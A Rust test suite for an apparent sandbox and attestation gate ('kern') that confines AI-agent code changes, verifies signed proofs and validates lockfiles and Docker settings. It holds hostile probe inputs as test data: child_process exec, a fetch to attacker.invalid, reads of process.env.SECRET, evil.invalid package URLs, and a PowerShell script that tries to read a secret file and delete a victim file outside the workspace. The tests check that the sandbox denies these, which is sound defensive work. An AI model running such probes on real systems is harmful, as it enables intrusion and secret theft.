#[test]
fn capability_check_blocks_only_widening_with_file_directory_and_operator_baselines() {
    let base = files(&[("src/a.js", "const fs = require('fs');\nmodule.exports = () => fs.existsSync('x');\n"), ("src/b.js", "const path = require('path');\n"), ("test/a.test.js", "const assert = require('assert');\n")]);
    let allow = std::collections::BTreeMap::from([("test/".to_string(), vec!["node:assert".to_string()])]);
    let check = |c: &Files| { let changed = git::changes(&base, c, &contract(&policy_value()).unwrap()).unwrap(); capability::check(&base, c, &changed, &allow) };
    let mut edit = base.clone();
    edit.insert("src/a.js".into(), file("const fs = require('fs');\nmodule.exports = () => fs.existsSync('y');\n"));
    check(&edit).unwrap();
    let mut sibling = base.clone();
    sibling.insert("src/c.js".into(), file("const path = require('path');\nconst fs = require('fs');\n"));
    check(&sibling).unwrap();
    let mut test = base.clone();
    test.insert("test/new.test.js".into(), file("const assert = require('node:assert');\n"));
    check(&test).unwrap();
    for attack in ["require('child_process').exec('id');", "fetch('https://attacker.invalid');", "const r = require; r('net');", "process.env.SECRET;"] {
        let mut c = base.clone();
        c.insert("src/a.js".into(), file(&format!("const fs = require('fs');\n{attack}\n")));
        denied(check(&c), "widens module capabilities");
    }
    let mut ts = base.clone();
    ts.insert("src/types.ts".into(), file("export const x: number = 1;\n"));
    check(&ts).unwrap();
    let mut shell = base.clone();
    shell.insert("src/run.sh".into(), file("curl x\n"));
    denied(check(&shell), "Unsupported changed file type");
}

#[test]
fn attestation_is_canonical_in_toto_vsa_bound_to_exact_expectations() {
    let f = fixture();
    let stmt: Value = serde_json::from_slice(&unb64(f.envelope["payload"].as_str().unwrap()).unwrap()).unwrap();
    assert_eq!(f.envelope["payloadType"], "application/vnd.in-toto+json");
    assert_eq!(stmt["_type"], "https://in-toto.io/Statement/v1");
    assert_eq!(stmt["predicateType"], "https://slsa.dev/verification_summary/v1");
    assert_eq!(stmt["subject"][0]["digest"]["gitCommit"], f.commit);
    assert_eq!(stmt["predicate"]["verificationResult"], "PASSED");
    assert!(stmt["predicate"]["verifiedLevels"][0].as_str().unwrap().starts_with("KERN_"));
    let d = promote::authorize(&f.store, &f.envelope, &f.public, &f.policy, &f.op, &expected(&f), now_ms()).unwrap();
    assert_eq!(d.commit, f.commit);
    for field in ["run_id", "task", "repository", "base", "commit", "manifest_sha256", "contract_sha256", "verifier_sha256", "verifier_builder_sha256", "deployment", "image", "runtime"] {
        let mut k = f.kern.clone();
        k[field] = json!("wrong");
        let env = attest::sign(&k, &KeySource::File(f.key.clone())).unwrap();
        assert!(promote::authorize(&f.store, &env, &f.public, &f.policy, &f.op, &expected(&f), now_ms()).is_err(), "{field}");
    }
    for (mutate, needle) in [
        (Box::new(|k: &mut Value| { k["checks"].as_array_mut().unwrap().pop(); }) as Box<dyn Fn(&mut Value)>, "check set"), (Box::new(|k: &mut Value| k["checks"][0]["status"] = json!("FAIL")), "failed"),
        (Box::new(|k: &mut Value| k["expires_at"] = k["issued_at"].clone()), "time window"), (Box::new(|k: &mut Value| k["issued_at"] = json!(now_ms() + 100000)), "time window"),
        (Box::new(|k: &mut Value| k["executor"]["kind"] = json!("kern-gvisor")), "not accepted"), (Box::new(|k: &mut Value| k["override"] = json!(true)), "unknown fields"),
    ] {
        let mut k = f.kern.clone();
        mutate(&mut k);
        let env = attest::sign(&k, &KeySource::File(f.key.clone())).unwrap();
        denied(promote::authorize(&f.store, &env, &f.public, &f.policy, &f.op, &expected(&f), now_ms()), needle);
    }
    let mut stmt2 = stmt.clone();
    stmt2["predicate"]["verificationResult"] = json!("FAILED");
    let bytes = canonical(&stmt2).unwrap().into_bytes();
    let sig = ed25519_dalek::Signer::sign(&f.key, &attest::pae(attest::PAYLOAD_TYPE, &bytes));
    let forged = json!({ "payloadType": attest::PAYLOAD_TYPE, "payload": b64(&bytes), "signatures": [{ "keyid": f.envelope["signatures"][0]["keyid"], "sig": b64(&sig.to_bytes()) }] });
    denied(promote::authorize(&f.store, &forged, &f.public, &f.policy, &f.op, &expected(&f), now_ms()), "canonical");
    let other = attest::public_pem(&SigningKey::from_bytes(&random_bytes::<32>().unwrap()).verifying_key()).unwrap();
    denied(promote::authorize(&f.store, &f.envelope, &other, &f.policy, &f.op, &expected(&f), now_ms()), "Untrusted");
    let mut tampered = f.envelope.clone();
    tampered["payload"] = json!(b64(b"{}"));
    denied(promote::authorize(&f.store, &tampered, &f.public, &f.policy, &f.op, &expected(&f), now_ms()), "signature");
    denied(promote::authorize(&f.store, &f.envelope, &f.public, &f.policy, &f.op, &expected(&f), now_ms() + 3_600_000), "expired");
    let mut main = expected(&f);
    main["branch"] = json!("main");
    denied(promote::authorize(&f.store, &f.envelope, &f.public, &f.policy, &f.op, &main, now_ms()), "run-specific");
}
#[test]
fn promotion_is_create_only_and_consumed_exactly_once() {
    let f = fixture();
    let d = promote::authorize(&f.store, &f.envelope, &f.public, &f.policy, &f.op, &expected(&f), now_ms()).unwrap();
    let target = git::init_store(&f.t.join("target.git")).unwrap();
    git::write_commit(&target, &f.original, None, "fixture").unwrap();
    promote::promote_local(&f.store, &d, &f.public, &target, None).unwrap();
    assert_eq!(git::trimmed(git::git(&target, &["rev-parse", &format!("refs/heads/{}", d.branch)], None).unwrap()), f.commit);
    git::git(&target, &["update-ref", "-d", &format!("refs/heads/{}", d.branch)], None).unwrap();
    denied(promote::promote_local(&f.store, &d, &f.public, &target, None), "already consumed");
    let ledger = f.t.join("ledger");
    let handles: Vec<_> = (0..8).map(|_| { let (l, dd, k) = (ledger.clone(), promote::Decision { repository: d.repository.clone(), branch: d.branch.clone(), base: d.base.clone(), commit: d.commit.clone(), run_id: d.run_id.clone(), attestation: Value::Null }, f.public.clone()); std::thread::spawn(move || promote::consume(&l, &dd, &k).is_ok()) }).collect();
    assert_eq!(handles.into_iter().map(|h| h.join().unwrap()).filter(|ok| *ok).count(), 1);
}
#[test]
fn github_required_check_reverifies_the_exact_pr_head() {
    let f = fixture();
    let repo = f.t.join("gh");
    sh(&f.t.0, &["init", "-q", "gh"]);
    sh(&repo, &["config", "core.autocrlf", "false"]);
    for (p, c) in &f.original { std::fs::create_dir_all(repo.join(p).parent().unwrap()).unwrap(); std::fs::write(repo.join(p), c.bytes.as_deref().unwrap()).unwrap(); }
    std::fs::create_dir_all(repo.join(".github/kern/tasks")).unwrap();
    let mut op = operator_value(&["external"]);
    op["checks"][0]["file"] = json!(std::path::absolute("checks.json").unwrap());
    std::fs::write(repo.join(".github/kern/operator.json"), op.to_string()).unwrap();
    std::fs::write(repo.join(".github/kern/verifier.pub"), &f.public).unwrap();
    std::fs::write(repo.join(".github/kern/tasks/fix-addition.json"), policy_value().to_string()).unwrap();
    sh(&repo, &["add", "-A"]);
    sh(&repo, &["commit", "-qm", "base"]);
    let base = sh(&repo, &["rev-parse", "HEAD"]);
    let mut candidate = git::read_commit(&repo, &base, 1048576, 16777216).unwrap();
    candidate.insert("src/add.mjs".into(), file("export const add = (a, b) => a + b;\n"));
    let head = git::write_commit(&repo, &candidate, Some(&base), "fix-addition").unwrap();
    let policy = contract(&policy_value()).unwrap();
    let opr = operator(&op).unwrap();
    let manifest = digest(&git::manifest(&repo, &head, 65536, 1048576).unwrap()).unwrap();
    let run_id = uuid4().unwrap();
    let envelope = attest::sign(&kern_payload(&policy, &opr, &run_id, &base, &head, &manifest, now_ms() - 7_200_000), &KeySource::File(f.key.clone())).unwrap();
    let d = promote::Decision { repository: "acme/project".into(), branch: format!("kern/fix-addition/{run_id}"), base: base.clone(), commit: head.clone(), run_id: run_id.clone(), attestation: Value::Null };
    let event = |head_sha: &str, base_sha: &str, branch: &str, body: &str| json!({ "pull_request": { "head": { "sha": head_sha, "ref": branch }, "base": { "sha": base_sha, "repo": { "full_name": "acme/project" } }, "body": body } });
    let body = promote::pr_body("fix-addition", &d, &envelope).unwrap();
    let pass = promote::check_pr(&event(&head, &base, &d.branch, &body), &repo, ".github/kern", now_ms()).unwrap();
    assert_eq!(pass["status"], "PASS");
    assert_eq!(promote::check_pr(&event(&head, &base, "feature/human", ""), &repo, ".github/kern", now_ms()).unwrap()["status"], "SKIPPED");
    denied(promote::check_pr(&event(&head, &base, &d.branch, "no attestation"), &repo, ".github/kern", now_ms()), "exactly one");
    denied(promote::check_pr(&event(&base, &base, &d.branch, &body), &repo, ".github/kern", now_ms()), "Attestation mismatch");
    let mut moved = candidate.clone();
    moved.insert("src/extra.mjs".into(), file("export const z = 1;\n"));
    let new_head = git::write_commit(&repo, &moved, Some(&base), "x").unwrap();
    denied(promote::check_pr(&event(&new_head, &base, &d.branch, &body), &repo, ".github/kern", now_ms()), "Attestation mismatch");
    let next_base = git::write_commit(&repo, &f.original, Some(&base), "moved").unwrap();
    denied(promote::check_pr(&event(&head, &next_base, &d.branch, &body), &repo, ".github/kern", now_ms()), "");
    let wrong_key = attest::sign(&kern_payload(&policy, &opr, &run_id, &base, &head, &manifest, now_ms() - 1000), &KeySource::File(SigningKey::from_bytes(&random_bytes::<32>().unwrap()))).unwrap();
    denied(promote::check_pr(&event(&head, &base, &d.branch, &promote::pr_body("fix-addition", &d, &wrong_key).unwrap()), &repo, ".github/kern", now_ms()), "Untrusted");
}
#[test]
fn ingest_accepts_external_agent_commits_only_within_the_contract() {
    let t = Temp::new();
    let source = t.join("source");
    sh(&t.0, &["init", "-q", "source"]);
    sh(&source, &["config", "core.autocrlf", "false"]);
    std::fs::create_dir_all(source.join("src")).unwrap();
    std::fs::write(source.join("src/add.mjs"), "export const add = (a, b) => a - b;\n").unwrap();
    std::fs::write(source.join("README.md"), "x\n").unwrap();
    sh(&source, &["add", "-A"]);
    sh(&source, &["commit", "-qm", "base"]);
    let base = sh(&source, &["rev-parse", "HEAD"]);
    sh(&t.0, &["clone", "-q", "source", "agent"]);
    let agent = t.join("agent");
    sh(&agent, &["config", "core.autocrlf", "false"]);
    std::fs::write(agent.join("src/add.mjs"), "export const add = (a, b) => a + b;\n").unwrap();
    sh(&agent, &["commit", "-qam", "agent fix"]);
    let good = sh(&agent, &["rev-parse", "HEAD"]);
    std::fs::write(agent.join("README.md"), "agent rewrote docs\n").unwrap();
    sh(&agent, &["commit", "-qam", "agent overreach"]);
    let bad = sh(&agent, &["rev-parse", "HEAD"]);
    std::fs::write(t.join("contract.json"), policy_value().to_string()).unwrap();
    std::fs::write(t.join("operator.json"), operator_value(&["external"]).to_string()).unwrap();
    std::fs::create_dir(t.join("keys")).unwrap();
    std::fs::write(t.join("keys/public.pem"), attest::keypair().unwrap().1).unwrap();
    std::fs::write(t.join("job.json"), json!({ "version": 3, "repo": "source", "base": base, "contract": "contract.json", "operator": "operator.json", "command": null, "verification_key": "keys/public.pem", "output": "tasks" }).to_string()).unwrap();
    let mut inside = policy::job(&t.join("job.json")).unwrap();
    inside.output = t.join("keys/tasks");
    assert_eq!(flow::task(&inside, flow::Source::Ingest(&agent, &good)).unwrap()["status"], "BLOCKED");
    assert!(!t.join("keys/tasks").exists());
    let job = policy::job(&t.join("job.json")).unwrap();
    let r = flow::task(&job, flow::Source::Ingest(&agent, &good)).unwrap();
    assert_eq!(r["status"], "CANDIDATE", "{r}");
    assert_eq!(r["executor"], "external");
    let bundle = PathBuf::from(r["bundle"].as_str().unwrap());
    assert!(std::fs::read_to_string(bundle.join("changes.patch")).unwrap().contains("+export const add = (a, b) => a + b;"));
    let imported = git::import_handoff(&bundle.join("handoff"), &t.join("verifier-run")).unwrap();
    assert_eq!(imported["commit"], r["commit"]);
    let blocked = flow::task(&job, flow::Source::Ingest(&agent, &bad)).unwrap();
    assert_eq!(blocked["status"], "BLOCKED");
    assert!(blocked["reason"].as_str().unwrap().contains("outside contract"));
}
#[test]
fn lockfiles_must_pin_every_package_to_the_registry_with_integrity() {
    let lock = |pkgs: Value| -> Files { [("package.json".to_string(), file("{}")), ("package-lock.json".to_string(), file(&json!({ "lockfileVersion": 3, "packages": pkgs }).to_string()))].into_iter().collect() };
    let ok = json!({ "": {}, "node_modules/a": { "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz", "integrity": "sha512-x" }, "node_modules/a/node_modules/b": { "inBundle": true } });
    assert_eq!(flow::validate_lockfile(&lock(ok), "registry.npmjs.org").unwrap()["sha1_only"], 0);
    let legacy = flow::validate_lockfile(&lock(json!({ "node_modules/a": { "resolved": "https://registry.npmjs.org/a.tgz", "integrity": "sha1-abc" } })), "registry.npmjs.org").unwrap();
    assert_eq!((legacy["packages"].as_u64(), legacy["sha1_only"].as_u64()), (Some(1), Some(1)));
    flow::validate_lockfile(&lock(json!({ "node_modules/a": { "resolved": "http://registry.npmjs.org/a.tgz", "integrity": "sha512-x" } })), "registry.npmjs.org").unwrap();
    denied(flow::validate_lockfile(&lock(json!({ "node_modules/a": { "resolved": "https://evil.invalid/a.tgz", "integrity": "sha512-x" } })), "registry.npmjs.org"), "does not resolve");
    denied(flow::validate_lockfile(&lock(json!({ "node_modules/a": { "resolved": "https://registry.npmjs.org.evil.invalid/a.tgz", "integrity": "sha512-x" } })), "registry.npmjs.org"), "does not resolve");
    denied(flow::validate_lockfile(&lock(json!({ "node_modules/a": { "resolved": "https://registry.npmjs.org/a.tgz", "integrity": "md5-x" } })), "registry.npmjs.org"), "standard integrity");
    denied(flow::validate_lockfile(&lock(json!({ "node_modules/a": { "link": true } })), "registry.npmjs.org"), "Linked");
    denied(flow::validate_lockfile(&lock(json!({ "node_modules/a": { "resolved": "https://registry.npmjs.org/a.tgz" } })), "registry.npmjs.org"), "standard integrity");
    denied(flow::validate_lockfile(&files(&[("package.json", "{}")]), "registry.npmjs.org"), "package-lock.json");
}
#[test]
fn docker_and_container_configuration_cannot_be_widened() {
    let t = Temp::new();
    let tool = t.join("tool");
    std::fs::write(&tool, "pinned-tool-fixture").unwrap();
    let p = json!({ "file": tool, "sha256": sha256(std::fs::read(&tool).unwrap()) });
    let control = json!({ "version": 1, "role": "executor", "docker": { "file": p["file"], "sha256": p["sha256"], "endpoint": policy::ENDPOINT }, "git": p, "host_policy": p,
        "runtime": { "file": "/usr/local/bin/runsc", "sha256": "a".repeat(64), "version": "fixture", "arguments": [] } });
    let c = policy::validate_control(&control).unwrap();
    let (_, args, env) = sandbox::docker_invocation(&c, &["info"], &[], Path::new("/fresh")).unwrap();
    assert_eq!(args[..4], ["--config", "/fresh", "--host", policy::ENDPOINT]);
    assert!(env.iter().any(|(k, v)| k == "PATH" && v.is_empty()) && !env.iter().any(|(k, _)| k == "DOCKER_HOST" || k == "HTTP_PROXY"));
    for flag in ["--host=tcp://evil", "--context=x", "-Htcp://evil", "--config", "--tls"] { denied(sandbox::docker_invocation(&c, &["info", flag], &[], Path::new("/x")), "overrides"); }
    // a check's own argv follows the image, where docker parses no flags; it may use names docker reserves for itself
    let check = ["__exec", "/bin/sh", "-c", "npm test -- --config ci.json"];
    let (_, args, _) = sandbox::docker_invocation(&c, &["create", "--name", "kern-x", "sha256:x"], &check, Path::new("/x")).unwrap();
    assert_eq!(args[args.len() - 5..], ["sha256:x", "__exec", "/bin/sh", "-c", "npm test -- --config ci.json"]);
    denied(sandbox::docker_invocation(&c, &["create", "--host=tcp://evil", "sha256:x"], &check, Path::new("/x")), "overrides");
    let mut remote = control.clone();
    remote["docker"]["endpoint"] = json!("tcp://attacker:2375");
    denied(policy::validate_control(&remote), "fixed local Docker socket");
    let mut args_runtime = control.clone();
    args_runtime["runtime"]["arguments"] = json!(["--platform=ptrace"]);
    denied(policy::validate_control(&args_runtime), "default runsc arguments");
    std::fs::write(&tool, "changed").unwrap();
    denied(sandbox::docker_invocation(&c, &["info"], &[], Path::new("/x")), "changed");
    let limits = contract(&policy_value()).unwrap().limits;
    let write = vec!["src/".to_string()];
    let spec = Spec { image: "sha256:x", snapshot: &t.0, control: &t.0, writable: &write, limits: &limits, entry: vec!["__runner".into()], network: "none", volumes: vec![], root: false, home_mb: 0 };
    let a = sandbox::container_args(&spec, "kern-x").unwrap().join(" ");
    for want in ["--runtime=runsc", "--network=none", "--read-only", "--user=1000:1000", "--cap-drop=ALL", "no-new-privileges", "--pull=never", "--entrypoint=/kern/kern"] { assert!(a.contains(want), "{want}"); }
    assert!(!a.contains("docker.sock") && a.matches("type=bind").count() == 3 && a.matches(",readonly").count() == 3);
    denied(sandbox::container_args(&Spec { network: "bridge", ..spec }, "kern-x"), "Only dependency setup");
}

#[cfg(windows)]
fn win(p: &Path) -> String { p.display().to_string() }
#[cfg(windows)]
#[test]
fn windows_box_blocks_escape_reads_writes_and_local_network() {
    let t = Temp::new();
    let ws = t.join("ws");
    std::fs::create_dir_all(&ws).unwrap();
    let outside = t.join("outside");
    std::fs::create_dir_all(&outside).unwrap();
    let victim = outside.join("victim.txt");
    std::fs::write(&victim, "keep").unwrap();
    let secret = outside.join("secret.env");
    std::fs::write(&secret, "TOPSECRET=42").unwrap();

    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    std::thread::spawn(move || { for s in listener.incoming() { drop(s); } });
    let control_reached = std::net::TcpStream::connect(("127.0.0.1", port)).is_ok();

    let rep = win(&ws.join("report.txt"));
    let tpl = "$r='REP'; \
        try{Set-Content -LiteralPath 'INS' -Value ok -ErrorAction Stop; Add-Content $r 'A inside ALLOWED'}catch{Add-Content $r 'A inside DENIED'}; \
        try{Set-Content -LiteralPath 'VIC' -Value pwned -ErrorAction Stop; Add-Content $r 'B write-outside ALLOWED'}catch{Add-Content $r 'B write-outside DENIED'}; \
        try{$c=[IO.File]::ReadAllText('SEC'); Add-Content $r ('D read-secret ALLOWED '+$c)}catch{Add-Content $r 'D read-secret DENIED'}; \
        try{Remove-Item -LiteralPath 'VIC' -ErrorAction Stop; Add-Content $r 'C delete-outside ALLOWED'}catch{Add-Content $r 'C delete-outside DENIED'}; \
        try{$t=New-Object Net.Sockets.TcpClient; $i=$t.BeginConnect('127.0.0.1',PORT,$null,$null); if($i.AsyncWaitHandle.WaitOne(1500) -and $t.Connected){Add-Content $r 'F loopback ALLOWED'}else{Add-Content $r 'F loopback DENIED'}; $t.Close()}catch{Add-Content $r 'F loopback DENIED'}";
    let script = tpl
        .replace("REP", &rep)
        .replace("INS", &win(&ws.join("inside.txt")))
        .replace("VIC", &win(&victim))
        .replace("SEC", &win(&secret))
        .replace("PORT", &port.to_string());
    let ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
    let job = json!({ "version": 1, "workspace": win(&ws), "tools": [], "denied": [], "network": false, "timeout_seconds": 60,
        "command": [ps, "-NoProfile", "-NonInteractive", "-Command", script] });
    let parsed = kern::local::box_job(&job).unwrap();
    let result = kern::local::run_box_job(&parsed).unwrap();
    assert_eq!(result["status"], "OK", "{result}");

    let report = std::fs::read_to_string(ws.join("report.txt")).expect("boxed process wrote report inside workspace");
    assert!(report.contains("A inside ALLOWED"), "{report}");
    assert!(report.contains("B write-outside DENIED"), "{report}");
    assert!(report.contains("C delete-outside DENIED"), "{report}");
    assert!(report.contains("D read-secret DENIED"), "{report}");
    assert!(report.contains("F loopback DENIED"), "{report}");
    assert_eq!(std::fs::read_to_string(&victim).unwrap(), "keep", "box must not have modified the outside victim file");
    assert!(control_reached, "independent control: the test process itself must reach the loopback listener the box was denied");
}

#[cfg(windows)]
#[test]
fn windows_run_flow_boxes_agent_gates_output_and_promotes_create_only() {
    let t = Temp::new();
    let repo = t.join("repo");
    std::fs::create_dir_all(repo.join("src")).unwrap();
    sh(&t.0, &["init", "-q", "repo"]);
    sh(&repo, &["config", "core.autocrlf", "false"]);
    std::fs::write(repo.join("src/add.mjs"), "export const add = (a, b) => a - b;\n").unwrap();
    std::fs::write(repo.join("README.md"), "# fixture\n").unwrap();
    sh(&repo, &["add", "-A"]);
    sh(&repo, &["commit", "-qm", "base"]);
    let base = sh(&repo, &["rev-parse", "HEAD"]);

    let contract = json!({ "version": 2, "task": "fix-addition", "filesystem": { "read": ["README.md", "src/", "test/"], "write": ["src/", "test/"] },
        "network": [], "secrets": [], "publish": false, "dependencies": null,
        "limits": { "files_changed": 8, "lines_changed": 200, "file_bytes": 65536, "total_bytes": 1048576, "timeout_seconds": 30, "memory_mb": 256, "pids": 64 }, "required_checks": ["build"] });
    std::fs::write(t.join("task.json"), contract.to_string()).unwrap();
    let cmd = r"C:\Windows\System32\cmd.exe";
    let runs = win(&t.join("runs"));

    let green = json!({ "version": 1, "repo": win(&repo), "base": base, "contract": "./task.json", "tools": [],
        "command": [cmd, "/c", ">src\\note.txt echo hello"], "network": false, "output": runs, "promote": true });
    std::fs::write(t.join("run-green.json"), green.to_string()).unwrap();
    let r = kern::local::local_run(&kern::local::run_job(&t.join("run-green.json")).unwrap()).unwrap();
    assert_eq!(r["status"], "GREEN", "{r}");
    let branch = r["promotion"]["branch"].as_str().unwrap().to_string();
    assert_eq!(sh(&repo, &["rev-parse", "HEAD"]), base, "the real HEAD must not move");
    assert_eq!(std::fs::read_to_string(repo.join("src/add.mjs")).unwrap(), "export const add = (a, b) => a - b;\n", "the real working tree must be untouched");
    assert_eq!(sh(&repo, &["cat-file", "-t", &format!("{branch}:src/note.txt")]), "blob", "the promoted branch must carry the agent's change");

    let blocked = json!({ "version": 1, "repo": win(&repo), "base": base, "contract": "./task.json", "tools": [],
        "command": [cmd, "/c", ">README.md echo x"], "network": false, "output": runs, "promote": true });
    std::fs::write(t.join("run-blocked.json"), blocked.to_string()).unwrap();
    let r2 = kern::local::local_run(&kern::local::run_job(&t.join("run-blocked.json")).unwrap()).unwrap();
    assert_eq!(r2["status"], "BLOCKED", "{r2}");
    assert!(r2["promotion"].is_null(), "an out-of-contract change must not be promoted");
    let kern_branches = sh(&repo, &["for-each-ref", "--format=%(refname:short)", "refs/heads/kern/"]);
    assert_eq!(kern_branches.lines().count(), 1, "only the green run may create a branch: {kern_branches}");
}

#[cfg(windows)]
#[test]
fn windows_box_terminates_a_runaway_agent_on_timeout() {
    let t = Temp::new();
    let ws = t.join("ws");
    std::fs::create_dir_all(&ws).unwrap();
    let ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
    let job = json!({ "version": 1, "workspace": win(&ws), "tools": [], "denied": [], "network": false, "timeout_seconds": 2,
        "command": [ps, "-NoProfile", "-NonInteractive", "-Command", "Start-Sleep -Seconds 30"] });
    let parsed = kern::local::box_job(&job).unwrap();
    let start = std::time::Instant::now();
    let r = kern::local::run_box_job(&parsed);
    assert!(start.elapsed() < std::time::Duration::from_secs(20), "the box must give up well before the 30s command would finish");
    match r { Ok(v) => panic!("expected a timeout denial, got {v}"), Err(e) => assert!(e.0.contains("timed out"), "{}", e.0) }
}

#[test]
fn factory_lock_gate_allows_a_proven_commit_and_refuses_everything_else() {
    let f = fixture();
    let cfg = f.t.join("config");
    std::fs::create_dir_all(cfg.join("tasks")).unwrap();
    std::fs::write(cfg.join("operator.json"), operator_value(&["external"]).to_string()).unwrap();
    std::fs::write(cfg.join("verifier.pub"), &f.public).unwrap();
    std::fs::write(cfg.join("tasks/fix-addition.json"), policy_value().to_string()).unwrap();

    let ok = promote::gate_artifact(&f.store, &f.commit, &f.envelope, &cfg, now_ms()).unwrap();
    assert_eq!(ok["status"], "ALLOW");
    assert_eq!(ok["commit"], f.commit);

    denied(promote::gate_artifact(&f.store, &f.base, &f.envelope, &cfg, now_ms()), "");
    let mut tampered = f.envelope.clone();
    tampered["payload"] = json!(b64(b"{}"));
    assert!(promote::gate_artifact(&f.store, &f.commit, &tampered, &cfg, now_ms()).is_err());
    let other = attest::public_pem(&SigningKey::from_bytes(&random_bytes::<32>().unwrap()).verifying_key()).unwrap();
    std::fs::write(cfg.join("verifier.pub"), &other).unwrap();
    denied(promote::gate_artifact(&f.store, &f.commit, &f.envelope, &cfg, now_ms()), "Untrusted");
}

#[test]
fn a_separately_built_checker_accepts_the_verifiers_proof() {
    // the GitHub Action builds its own kern; only the version, policy and pinned verifier identity must match
    let f = fixture();
    let cfg = f.t.join("config");
    std::fs::create_dir_all(cfg.join("tasks")).unwrap();
    std::fs::write(cfg.join("operator.json"), operator_value(&["external"]).to_string()).unwrap();
    std::fs::write(cfg.join("verifier.pub"), &f.public).unwrap();
    std::fs::write(cfg.join("tasks/fix-addition.json"), policy_value().to_string()).unwrap();
    std::fs::write(f.t.join("attestation.json"), f.envelope.to_string()).unwrap();
    assert_ne!(sha256(std::fs::read(env!("CARGO_BIN_EXE_kern")).unwrap()), policy::implementation_digest().unwrap());
    let out = Command::new(env!("CARGO_BIN_EXE_kern")).arg("gate-artifact").arg(&f.store).arg(&f.commit).arg(f.t.join("attestation.json")).arg(&cfg).output().unwrap();
    assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
    assert_eq!(serde_json::from_slice::<Value>(&out.stdout).unwrap()["status"], "ALLOW");
}

#[test]
fn factory_lock_refuses_an_unverified_task_name_before_reading_config() {
    let f = fixture();
    let cfg = f.t.join("config");
    std::fs::create_dir_all(cfg.join("tasks")).unwrap();
    std::fs::write(cfg.join("operator.json"), operator_value(&["external"]).to_string()).unwrap();
    std::fs::write(cfg.join("verifier.pub"), &f.public).unwrap();
    std::fs::write(f.t.join("escape.json"), "{").unwrap(); // outside the trusted config directory
    let mut k = f.kern.clone();
    k["task"] = json!("../../escape");
    let envelope = attest::sign(&k, &KeySource::File(f.key.clone())).unwrap();
    denied(promote::gate_artifact(&f.store, &f.commit, &envelope, &cfg, now_ms()), "Invalid task");
}

#[test]
fn dev_side_confirm_accepts_only_the_trusted_signed_proof_for_the_exact_commit() {
    let f = fixture();
    // the genuine verifier-signed proof for the approved commit is accepted
    kern::local::confirm_attestation(&f.envelope, &f.public, &f.commit).unwrap();
    // a different (untrusted) key is refused
    let other = attest::public_pem(&SigningKey::from_bytes(&random_bytes::<32>().unwrap()).verifying_key()).unwrap();
    denied(kern::local::confirm_attestation(&f.envelope, &other, &f.commit), "trusted verifier key");
    // a tampered payload breaks the signature
    let mut tampered = f.envelope.clone();
    tampered["payload"] = json!(b64(b"{}"));
    assert!(kern::local::confirm_attestation(&tampered, &f.public, &f.commit).is_err());
    // a proof that binds a different commit is refused (exact-hash binding)
    denied(kern::local::confirm_attestation(&f.envelope, &f.public, &f.base), "exact approved commit");
}

#[test]
fn file_level_write_grants_enable_root_source_repos() {
    let c = json!({ "version": 2, "task": "root-src", "filesystem": { "read": ["index.js", "lib/"], "write": ["index.js", "lib/"] },
        "network": [], "secrets": [], "publish": false, "dependencies": null,
        "limits": { "files_changed": 8, "lines_changed": 200, "file_bytes": 65536, "total_bytes": 1048576, "timeout_seconds": 30, "memory_mb": 256, "pids": 64 }, "required_checks": ["build"] });
    let policy = contract(&c).unwrap();
    assert_eq!(policy.write, vec!["index.js".to_string(), "lib/".to_string()]);
    let base = files(&[("index.js", "module.exports = require('./lib/a');\n"), ("lib/a.js", "module.exports = 1;\n"), ("README.md", "hi\n")]);
    let mut good = base.clone();
    good.insert("index.js".into(), file("module.exports = require('./lib/a');\n// kern edit\n"));
    git::changes(&base, &good, &policy).unwrap();
    let mut good2 = base.clone();
    good2.insert("lib/a.js".into(), file("module.exports = 2;\n"));
    git::changes(&base, &good2, &policy).unwrap();
    let mut bad = base.clone();
    bad.insert("README.md".into(), file("hacked\n"));
    denied(git::changes(&base, &bad, &policy), "outside contract");
    let mut overlap = c.clone();
    overlap["filesystem"]["read"] = json!(["lib/", "lib/a.js"]);
    overlap["filesystem"]["write"] = json!(["lib/", "lib/a.js"]);
    denied(contract(&overlap), "Overlapping");
}

#[test]
fn large_assets_stream_without_loading_and_changed_assets_fail_closed() {
    let t = Temp::new();
    let repo = t.join("repo");
    std::fs::create_dir_all(repo.join("src")).unwrap();
    sh(&t.0, &["init", "-q", "repo"]);
    sh(&repo, &["config", "core.autocrlf", "false"]);
    std::fs::write(repo.join("logo.bin"), vec![7u8; 2 * 1048576]).unwrap(); // 2 MiB asset, > file_bytes
    std::fs::write(repo.join("src/a.js"), "module.exports = 1;\n").unwrap();
    sh(&repo, &["add", "-A"]);
    sh(&repo, &["commit", "-qm", "base"]);
    let base = sh(&repo, &["rev-parse", "HEAD"]);

    // the 2 MiB asset is recorded opaquely (oid+size, no bytes), not rejected; small source is loaded
    let files = git::read_commit(&repo, &base, 65536, 1048576).unwrap();
    assert_eq!(files.len(), 2);
    assert!(files["logo.bin"].bytes.is_none() && files["logo.bin"].size == 2 * 1048576);
    assert!(files["src/a.js"].bytes.is_some());
    // streamed manifest sha256 is deterministic
    assert_eq!(digest(&git::manifest(&repo, &base, 65536, 1048576).unwrap()).unwrap(), digest(&git::manifest(&repo, &base, 65536, 1048576).unwrap()).unwrap());
    // write_commit round-trips the tree, referencing the opaque asset by oid
    let rewritten = git::write_commit(&repo, &files, None, "t").unwrap();
    assert_eq!(sh(&repo, &["rev-parse", &format!("{rewritten}^{{tree}}")]), sh(&repo, &["rev-parse", "HEAD^{tree}"]));

    let policy = contract(&json!({ "version": 2, "task": "asset", "filesystem": { "read": ["src/", "logo.bin"], "write": ["src/", "logo.bin"] },
        "network": [], "secrets": [], "publish": false, "dependencies": null,
        "limits": { "files_changed": 8, "lines_changed": 200, "file_bytes": 65536, "total_bytes": 1048576, "timeout_seconds": 30, "memory_mb": 256, "pids": 64 }, "required_checks": ["build"] })).unwrap();
    // an in-contract source edit passes; the unchanged 2 MiB asset is skipped, not diffed
    let mut good = files.clone();
    good.insert("src/a.js".into(), file("module.exports = 2;\n"));
    let changed = git::changes(&files, &good, &policy).unwrap();
    assert_eq!(changed["files"].as_array().unwrap().len(), 1);
    // a CHANGED large asset (opaque on both sides, different oid) fails closed
    let mut bad = files.clone();
    bad.insert("logo.bin".into(), git::Entry { mode: "100644".into(), oid: "a".repeat(40), size: 2 * 1048576, bytes: None });
